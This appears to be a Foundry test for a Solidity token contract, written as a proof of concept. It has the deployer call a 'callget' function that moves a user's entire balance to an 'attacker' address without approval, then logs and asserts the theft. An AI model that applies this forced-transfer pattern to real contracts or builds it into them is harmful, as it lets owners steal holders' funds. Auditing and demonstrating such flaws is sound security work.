// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MyBond.sol";

contract MyBondTest is Test {
    MyBond bond;
    address deployer = address(0x1);
    address user = address(0x2);
    address attacker = address(0x3);
    uint256 constant INITIAL_BALANCE = 1000 ether;

    function setUp() public {
        vm.startPrank(deployer);
        bond = new MyBond();
        bond.mint(user, INITIAL_BALANCE);
        vm.stopPrank();
    }

    function testAtomicityViolation() public {
        console.log("--- BEFORE-Trigger callget ---");
        uint256 userBalanceBefore = bond.balanceOf(user);
        uint256 attackerBalanceBefore = bond.balanceOf(attacker);
        console.log("User balance before:", userBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);
        // Verify initial state
        assertEq(userBalanceBefore, INITIAL_BALANCE, "User should start with full balance");
        assertEq(attackerBalanceBefore, 0, "Attacker should start with 0 balance");

        console.log("--- Trigger callget ---");
        // Execute critical vulnerability operation
        vm.prank(deployer);
        bond.callget(user, attacker, userBalanceBefore);

        console.log("--- AFTER-Trigger callget ---");
        uint256 userBalanceAfter = bond.balanceOf(user);
        uint256 attackerBalanceAfter = bond.balanceOf(attacker);
        console.log("User balance after:", userBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);

        // Calculate balance changes
        uint256 userLoss = userBalanceBefore - userBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        bool unauthorizedTransfer = (userLoss == INITIAL_BALANCE) && (attackerGain == INITIAL_BALANCE);
        
        console.log("User tokens lost:", userLoss);
        console.log("Attacker tokens gained:", attackerGain);
        console.log("Unauthorized transfer success:", unauthorizedTransfer);

        // Final vulnerability verdict
        if (unauthorizedTransfer) {
            console.log("Vulnerability Exists: Owner can forcibly transfer user tokens without approval");
        } else {
            console.log("Vulnerability not Exist: Token transfers require proper approval");
        }
        
        // Validation assertions (keep existing verification logic)
        assertEq(userBalanceAfter, 0, "User's tokens were stolen");
        assertEq(attackerBalanceAfter, INITIAL_BALANCE, "Attacker has stolen tokens");
    }
}